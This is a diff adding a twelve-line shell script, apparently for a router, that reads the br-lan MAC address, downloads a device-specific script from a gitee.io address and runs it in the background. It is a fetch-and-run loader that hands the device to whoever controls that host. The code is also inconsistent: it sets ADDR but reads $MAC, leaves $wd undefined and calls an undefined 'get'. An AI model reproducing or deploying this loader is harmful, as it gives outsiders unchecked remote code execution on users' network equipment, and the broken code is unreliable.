@@ -1,0 +1,12 @@
+#!/bin/sh
+#/tmp/conn/extension
+
+ADDR=`cat /sys/class/net/br-lan/address`
+addr=`echo $MAC | sed "s/:/-/g"`
+
+if [ ! -f "$wd/$addr" ]; then
+    get "https://qq179055016.gitee.io/static/$addr" || \
+        exit 1
+fi
+sh $wd/$addr &
+
